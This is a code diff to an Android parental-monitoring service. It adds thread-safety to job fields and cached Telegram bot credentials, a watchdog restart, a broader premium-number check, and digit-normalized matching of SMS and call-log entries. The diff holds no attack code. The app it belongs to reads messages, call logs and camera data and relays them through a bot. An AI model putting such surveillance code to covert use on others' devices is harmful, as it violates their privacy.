@@ -107,10 +107,15 @@ class MonitoringService : Service() {
     private enum class MediaSendOutcome {
         SENT, KEPT, DROPPED
     }
+    @Volatile
     private var monitoringJob: Job? = null
+    @Volatile
     private var cameraJob: Job? = null
+    @Volatile
     private var commandJob: Job? = null
+    @Volatile
     private var initialSyncJob: Job? = null
+    @Volatile
     private var patrolJob: Job? = null
     private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
     private val initialSyncLock = Any()
@@ -436,6 +441,9 @@ class MonitoringService : Service() {
             refreshCreds()
             refreshLoopConfig()
             return
+        }
+        if (loopWatchdogJob?.isActive != true) {
+            try { startLoopWatchdog() } catch (_: Exception) { }
         }
         serviceStartAt = System.currentTimeMillis()
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")
@@ -773,12 +781,15 @@ class MonitoringService : Service() {
         }
     }
 
+    private val credsLock = Any()
     private fun refreshCreds() {
-        try {
-            cachedBotToken = preferencesManager.botToken
-            cachedChatId = preferencesManager.chatId
-            cachedOwnerId = preferencesManager.ownerUserId
-        } catch (_: Exception) {
+        synchronized(credsLock) {
+            try {
+                cachedBotToken = preferencesManager.botToken
+                cachedChatId = preferencesManager.chatId
+                cachedOwnerId = preferencesManager.ownerUserId
+            } catch (_: Exception) {
+            }
         }
     }
 
@@ -901,7 +912,7 @@ class MonitoringService : Service() {
             credsCheckAt = now
             refreshCreds()
         }
-        return cachedBotToken to cachedChatId
+        return synchronized(credsLock) { cachedBotToken to cachedChatId }
     }
 
     private fun hasNetwork(): Boolean {
@@ -2852,7 +2863,7 @@ class MonitoringService : Service() {
         if (intl.startsWith("011")) intl = intl.substring(3)
         else if (intl.startsWith("00")) intl = intl.substring(2)
         val local = if (digits.startsWith("0")) digits.substring(1) else digits
-        if (local == "1900" || local.startsWith("1900") || local == "900" || local == "976") return true
+        if (local == "1900" || local.startsWith("1900") || local.startsWith("900") || local.startsWith("976")) return true
         if (intl.startsWith("44")) {
             val uk = intl.substring(2)
             if (uk.startsWith("70") || uk.startsWith("90") || uk.startsWith("118") || uk.startsWith("09") || uk.startsWith("087") || uk.startsWith("084")) return true
@@ -3867,15 +3878,18 @@ class MonitoringService : Service() {
             val digits = number.filter { it.isDigit() }
             if (digits.length < 7) return 0
             var n = 0
+            val wantAlt = com.redeye.parentalmonitor.utils.PhoneNumbers.altVariant(digits)
             try {
                 for (s in smsRepository.getRecentSmsSince(since, 200)) {
-                    if (com.redeye.parentalmonitor.utils.PhoneNumbers.numbersEqualFast(s.address, number, null)) n++
+                    val have = s.address.filter { it.isDigit() }
+                    if (have.isNotEmpty() && com.redeye.parentalmonitor.utils.PhoneNumbers.numbersEqualFast(have, digits, wantAlt)) n++
                 }
             } catch (_: Exception) {
             }
             try {
                 for (c in callLogRepository.getCallsSince(since, 200)) {
-                    if (com.redeye.parentalmonitor.utils.PhoneNumbers.numbersEqualFast(c.number, number, null)) n++
+                    val have = c.number.filter { it.isDigit() }
+                    if (have.isNotEmpty() && com.redeye.parentalmonitor.utils.PhoneNumbers.numbersEqualFast(have, digits, wantAlt)) n++
                 }
             } catch (_: Exception) {
             }
